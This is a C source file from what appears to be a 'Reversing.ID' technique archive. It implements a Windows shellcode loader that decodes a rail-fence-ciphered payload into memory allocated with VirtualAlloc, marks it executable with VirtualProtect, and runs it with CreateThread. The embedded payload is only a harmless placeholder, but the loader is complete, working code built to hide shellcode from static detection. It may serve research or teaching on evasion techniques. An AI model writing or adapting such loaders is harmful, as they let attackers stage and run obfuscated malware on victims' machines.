/*
    Shellcode Loader
    Archive of Reversing.ID

    Reordering the shellcode with custom algorithm.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    rail-fence cipher
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <string.h>
#include <stdint.h>

/*
    Encoded shellcode format:
        [K] [Shellcode]

    K is the key for rail-fence cipher, which represent the height of fence
*/

/*
    dst: buffer which will receive the decoded shellcode
    src: buffer which store encoded shellcode
    size: the size of encoded buffer.
*/
void transform (uint8_t * dst, uint8_t * src, size_t size)
{
    uint8_t k = src[0];
    
    size_t s[2];
    size_t i, j, p, idx;

    p = 0;
    s[0] = (k-1) * 2;
    s[1] = 0;

    // rearrange
    for (i = 0; i < k; i++)
    {
        j = i;
        idx = 0;

        while (j < size)
        {
            dst[j] = src[p + 1];
            if (s[idx])
            {
                j += s[idx];
                p++;
            }
            idx = (idx + 1) & 1;
        }

        s[0] -= 2;
        s[1] += 2;
    }
}


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stackz
    uint8_t     payload []  = { 0x07,0x90,0x90,0xcc,0xc3 };
    uint32_t    payload_len = 5;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // decode payload and store to allocated buffer 
    // discard first byte which is key
    transform ((uint8_t*)runtime, payload, payload_len-1);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}